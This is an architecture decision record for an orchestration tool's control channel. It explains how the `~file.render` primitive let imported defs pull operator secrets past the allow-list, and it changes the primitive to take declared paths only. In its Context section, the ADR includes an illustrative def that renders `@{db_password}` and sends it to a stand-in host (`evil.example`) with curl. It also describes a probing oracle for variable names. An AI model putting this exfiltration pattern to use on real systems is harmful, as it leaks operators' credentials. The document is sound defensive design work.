# ADR 0042 — `~file.render` renders a declared file, not a string the target submits

## Status

Active. **Amends [ADR-0031](0031-control-channel-and-detachment.md) §3**, which claimed a
bound the channel did not hold, and **narrows [ADR-0036](0036-primitive-and-location-markers.md)
§5**. It reverses one point of [ADR-0034](0034-control-host-primitives.md) §3 — the
composability argument for splitting read from render — and leaves the rest of all three
standing.

## Context

ADR-0031 §3 states the rule that makes the control channel safe:

> *Before sending, the control host derives from the plan the set of resources a job may
> legitimately request. Any request outside that set is refused […] Instructions can come
> from third parties (ADR-0016); without this rule, an imported def could ask for
> `~/.ssh/id_ed25519` and the control host — the machine holding every key and secret —
> would answer.*

That bound covers one of the channel's two ask kinds. `answer()` routes `file.render:`
and returns before reaching `readResource`, so `allow.resolve` is never consulted
(`internal/orchestrator/serve.go:138-152`). The renderer then substitutes over
`mergeVars(baseVars, host.Vars, setVars)` (`cmd/shellf/main.go:224-236`), and secrets are
merged into `setVars` (`cmd/shellf/main.go:145-147`).

The content being rendered comes **from the target**. So an imported def can compose the
string itself:

```
apply {
    leak = ~file.render("@{db_password}")
    unsafe shell { curl evil.example -d "@{leak}" }
}
```

No file is declared, so nothing refuses it. The agent is not at fault and needs no
hardening: it is a faithful interpreter of defs that arrive as source
([ADR-0014](0014-user-defs-directory-package.md)), and it sends what the def asked for.

Two details make this worse than it first reads:

- An unknown name answers `undefined variable "x" in template`
  (`internal/lang/parser.go:953-955`), which is an existence oracle: names can be probed.
- The control host cannot tell who is asking. `Def` carries no origin
  (`internal/lang/ast.go:6-20`) and an ask carries no caller
  (`internal/proto/channel.go:33-73`). The trusted/untrusted split introduced in #383 is
  *stdlib vs user code*, decided at parse time (`internal/lang/def_parser.go:25-35`) — a
  local def and an imported one are indistinguishable, then and later.

What must not be mistaken for the problem: which variables a template may use. The
legitimate case *is* the shape of the attack — `examples/assets/blog/compose.env.tmpl`
renders `@{db_password}`, a secret the def never received as a parameter, and it is right
to. Restricting names is therefore the wrong axis; the origin of the text is the right
one.

## Decision

### 1. `~file.render` takes a control-host path, not content

```
~file.render(%"blog/compose.env.tmpl")
```

The argument is a `%"…"` path. The control host opens that file itself and substitutes
over it. Nothing to render travels up from the target, so there is no longer a place
where the target chooses what the operator's variables get substituted into.

Anything else is refused where `~dir.sync` already refuses it — at evaluation, naming the
fix (*mark it* `%"…"`), not with a substituted value.

This makes the primitive set homogeneous: `~file.read`, `~dir.list`, `~dir.sync` and now
`~file.render` all take a declared path, and `~file.write` is the only one that acts.

### 2. The ask goes through the allow-list like every other read

`file.render:<path>` resolves through `Allowed.resolve`, with the containment and symlink
checks `readResource` already performs (#393). A path the plan never declared is refused
by name, which is the sentence ADR-0031 §3 always claimed.

`ControlResources` gains `file.render` alongside the keys it already derives for a `%`
occurrence: the plan says "this file is mine to serve", and which read primitive consumes
it is the def's business.

### 3. The caller's scope still travels, because it is the caller's own

An ask keeps carrying `Vars` — the def's parameters and any `with { }` binding at the
call site (ADR-0036 §5). Those values came from the plan in the first place, and a
template that names one would otherwise fail as undefined. What changes is only what the
target may hand over: its own bindings, never the text they are substituted into.

### 4. `file.template` loses a round trip

```
def template(src: str, dst: str) {
    file.write(dst, ~file.render(src))
}
```

Today the raw template is sent to the target by `~file.read` and sent straight back by
`~file.render` (`internal/std/file/file.shellf:150`). That return leg *is* the hole. It
disappears here as a consequence, not as a separate optimisation: only the rendered
content crosses, once.

### 5. What this does not claim

- **The allow-list is self-declaring.** `ControlResources` scans defs as well as plan
  steps (`internal/lang/control_scan.go:18-22`), so an imported def that writes
  `%"blog/compose.env.tmpl"` in its own body declares that access itself, bounded only to
  `assets/`. This ADR brings the variable half up to the file half; it does not fix the
  file half, which is #403.
- **Secrets still reach the target.** They always did, by way of rendered content and plan
  interpolation. [ADR-0018](0018-secrets.md) decided that and is not reopened.
- **The caller's scope wins over the host environment** (`cmd/shellf/main.go:229-231`), so
  a target can shadow a host variable in its *own* render. That substitutes a value it
  already holds into a file it already receives; it discloses nothing and stays as is.

## Rejected alternatives

- **Bound the render to the variables the def was passed.** The obvious reading of the
  problem, and it breaks every real template: `compose.env.tmpl` renders `@{db_password}`,
  which `file.template` never receives. It would forbid the feature to fix the abuse.
- **Derive an allow-list of variable *names* from the declared assets** (the union of
  their `@{…}`). Symmetric with the file allow-list, and it fails in the canonical case:
  the blog plan renders `db_password`, so the name is allowed, so the malicious def asks
  for it and gets it. Motion without protection.
- **Have the plan declare the renderable variables by name.** Closes it, at the cost of a
  grammar change, a breaking edit to every existing plan, and a declaration to maintain on
  every host — for a bound the file path already expresses.
- **Reserve `~file.render` to trusted code (the stdlib)**, extending the
  [ADR-0040](0040-rerunnable-steps-and-unsafe-shell.md) §6
  exemption axis. Cheap, and it closes less than it looks: the third-party def then calls
  `file.template(%"…")`, and by §5 above it declares that path itself. It also removes a
  primitive from user defs for a reason they cannot inspect.
- **Document the hole and keep the behaviour.** Honest, and it leaves ADR-0031 §3
  justifying the allow-list by third-party defs while a third-party def walks around it.
  The channel would be bounded for files and open for variables, with no principle
  explaining the difference.

## Consequences

- Breaking: `~file.render(content)` no longer exists. `file.template` and any user def
  calling the primitive directly change with it; the refusal names the `%"…"` form.
- The case ADR-0034 §3 kept the split for — rendering a template whose source lives on the
  target, `~file.render(shell { cat … })` — is gone. It is used by no plan, example or
  stdlib def; it is exercised by one test,
  `internal/agent/primitives_test.go:140`, which the implementation must change and which
  therefore needs explicit approval before it is touched. If the case is wanted later, it
  comes back as its own decision, with a bound for the text it accepts.
- `usesRender` (`cmd/shellf/main.go:259-265`) becomes unnecessary: a render now implies a
  declared `%"…"`, so the channel is opened by the allow-list being non-empty.
- One fewer round trip per template, and the raw template stops being sent to a host that
  only needs the result.
- `docs/language.md` and `docs/adr/0036…` §5's primitive table record the new signature.
